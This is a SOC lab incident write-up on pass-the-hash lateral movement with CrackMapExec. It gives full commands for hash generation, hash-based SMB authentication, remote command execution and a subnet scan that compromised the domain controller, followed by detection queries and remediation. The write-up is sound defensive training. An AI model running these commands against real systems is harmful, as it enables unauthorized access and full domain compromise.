# INC-004 — Pass-the-Hash Lateral Movement

> **Status:** ✅ Complete  
> **Date:** 2026-08-25  
> **MITRE ATT&CK:** [T1550.002 — Use Alternate Authentication Material: Pass the Hash](https://attack.mitre.org/techniques/T1550/002/)  
> **Tactic:** Lateral Movement  
> **Severity:** Critical  

---

## Summary

An attacker operating from a Kali host (`SOC-Lab-Attacker`, 172.16.0.11) used a captured NTLM hash derived from the domain Administrator password to authenticate to a Windows 10 victim machine (`SOC-Lab-Endpoint`, 172.16.0.10) via SMB — without ever using the plaintext password. A subnet-wide scan subsequently confirmed the same hash granted full administrative access to the Domain Controller (172.16.0.5), demonstrating complete domain compromise from a single captured hash.

The victim machine generated **40 Security Event ID 4624** events with `LogonType: 3` (Network) and `AuthenticationPackageName: NTLM`, all ingested into ELK and confirmed in Kibana at `2026-08-25T12:16:28Z`.

---

## Environment

| Component | Value |
|-----------|-------|
| Domain | `SOC.LAB` |
| Domain Controller | `SOC-Lab-DC` / `172.16.0.5` |
| Attacker (Kali) | `SOC-Lab-Attacker` / `172.16.0.11` |
| Victim (Win10) | `SOC-Lab-Endpoint` / `172.16.0.10` |
| Target account | `soc.lab\Administrator` |
| Tool used | `CrackMapExec (CME)` |
| NTLM hash | `217cac874bc6e41a6fec9b06d2eee7d5` *(lab artefact only — not a production credential)* |
| Hash source | Derived from Administrator domain credential |

---

## Attack Walkthrough

### 1. Credential Validation (plaintext — baseline check only)

Before running PtH, the Administrator credential was validated with plaintext to confirm SMB access:

```bash
crackmapexec smb 172.16.0.10 -u Administrator -p '<redacted>'
```

**Result:**
```
SMB  172.16.0.10  445  SOC-LAB-ENDPOIN  [+] soc.lab\Administrator:<redacted> (Pwn3d!)
```

> This step is for lab baseline only. The actual attack uses the hash exclusively.

### 2. NTLM Hash Generation (Kali)

The NTLM hash was derived inline from the known plaintext credential:

```bash
python3 -c "import hashlib; print(hashlib.new('md4', '<redacted>'.encode('utf-16le')).hexdigest())"
```

**Result:** `217cac874bc6e41a6fec9b06d2eee7d5` *(lab artefact only — not a production credential)*

> The plaintext credential is excluded from version control. The NTLM hash is included as it is the attack artefact.

### 3. Pass-the-Hash via CrackMapExec (Kali → Win10)

```bash
crackmapexec smb 172.16.0.10 -u Administrator -H 217cac874bc6e41a6fec9b06d2eee7d5
```

**Result:**
```
SMB  172.16.0.10  445  SOC-LAB-ENDPOIN  [+] soc.lab\Administrator:217cac874bc6e41a6fec9b06d2eee7d5 (Pwn3d!)
```

### 4. Remote Command Execution (RCE)

Full code execution confirmed via the `-x` flag:

```bash
crackmapexec smb 172.16.0.10 -u Administrator -H 217cac874bc6e41a6fec9b06d2eee7d5 -x "whoami"
```

**Result:** `soc\administrator`

```bash
crackmapexec smb 172.16.0.10 -u Administrator -H 217cac874bc6e41a6fec9b06d2eee7d5 -x "hostname"
```

**Result:** `SOC-Lab-Endpoint`

```bash
crackmapexec smb 172.16.0.10 -u Administrator -H 217cac874bc6e41a6fec9b06d2eee7d5 -x "net user"
```

**Result:** `Administrator`, `DefaultAccount`, `Guest`, `SOC-Lab-Endpoint`, `WDAGUtilityAccount`

### 5. Network Reconnaissance (ipconfig /all)

```bash
crackmapexec smb 172.16.0.10 -u Administrator -H 217cac874bc6e41a6fec9b06d2eee7d5 -x "ipconfig /all"
```

| Field | Value |
|-------|-------|
| Host Name | `SOC-Lab-Endpoint` |
| Primary DNS Suffix | `soc.lab` |
| IPv4 Address | `172.16.0.10` |
| Subnet Mask | `255.255.0.0` |
| Default Gateway | `172.16.0.1` |
| DNS Servers | `172.16.0.5` |
| MAC Address | `00-0C-29-DB-02-50` |

### 6. Lateral Movement — Subnet-Wide Scan

```bash
crackmapexec smb 172.16.0.0/24 -u Administrator -H 217cac874bc6e41a6fec9b06d2eee7d5
```

**Critical Finding:**

| Host | Result |
|------|--------|
| `172.16.0.10` — SOC-LAB-ENDPOIN | `[+] (Pwn3d!)` ✅ |
| `172.16.0.5` — SOC-LAB-DC | `[+] (Pwn3d!)` ✅ |

> **One hash = full domain compromise.** The same Administrator NTLM hash authenticated to both the workstation and the Domain Controller — demonstrating the true blast radius of Pass-the-Hash in a flat network with shared credentials.

---

## Detection

### Primary Signal — Event ID 4624 (40 events)

| Field | Value |
|-------|-------|
| Event ID | `4624` |
| Action | An account was successfully logged on |
| Logon Type | `3` (Network) |
| Authentication Package | `NTLM` |
| Account Name | `Administrator` |
| Target Host | `SOC-Lab-Endpoint` |
| Source IP | `172.16.0.11` (Kali) |
| ELK Index | `winlogbeat-2026.08.25` |
| First Event | `2026-08-25T12:16:28.266Z` |
| Total Events | **40** |

### ELK Query (KQL)

```kql
event.code: "4624"
AND winlog.event_data.LogonType: "3"
AND winlog.event_data.AuthenticationPackageName: "NTLM"
AND NOT winlog.event_data.IpAddress: ("127.0.0.1" OR "::1" OR "-")
```

### Sigma Rule

See [`detection/sigma/T1550.002-pass-the-hash.yml`](../../detection/sigma/T1550.002-pass-the-hash.yml)

---

## Evidence Index

| # | Type | Description | Sensitive? |
|---|------|-------------|------------|
| 1 | Windows Event | 40× EID 4624 — LogonType 3 + NTLM from 172.16.0.11 | No |
| 2 | ELK Record | `winlogbeat-2026.08.25` — 40 hits at 12:16:28Z | No |
| 3 | CME output | `(Pwn3d!)` on Win10 + DC subnet scan | No |
| 4 | RCE output | `whoami` → `soc\administrator`, `hostname` → `SOC-Lab-Endpoint` | No |
| 5 | NTLM hash | `217cac874bc6e41a6fec9b06d2eee7d5` *(lab artefact only)* | Moderate |
| 6 | Plaintext credential | Source password | **Yes — local only** |

---

## Why NTLM Makes This Dangerous

NTLM authentication is challenge-response based and accepts the raw hash directly as the authenticator — no plaintext password required. Unlike Kerberos, NTLM cannot be protected by ticket expiry or time-limited tokens. An attacker who captures a single NTLM hash gains persistent access to every system that account can reach. In this lab, one hash compromised both the workstation and the Domain Controller — the entire domain.

---

## Remediation

- **Enable Credential Guard** — isolates NTLM credentials in a virtualised container, preventing hash extraction from LSASS.
- **Add Administrator to Protected Users group** — members cannot authenticate via NTLM; Kerberos only.
- **Deploy LAPS** — randomises local Administrator passwords per machine, eliminating hash reuse across hosts.
- **Disable NTLM where possible** — enforce Kerberos via GPO (`Network security: Restrict NTLM`).
- **Network segmentation** — a flat `/16` subnet allowed the hash to reach every host. VLANs with firewall rules between tiers would have contained lateral movement.
- **Monitor EID 4624** — alert on LogonType 3 + NTLM + privileged account from non-standard source IPs.

---

## References

- [MITRE ATT&CK T1550.002](https://attack.mitre.org/techniques/T1550/002/)
- [Microsoft EID 4624 Documentation](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4624)
- [CrackMapExec Documentation](https://github.com/byt3bl33d3r/CrackMapExec)
- [Microsoft LAPS Overview](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)
- [Protected Users Security Group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [Microsoft Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard)
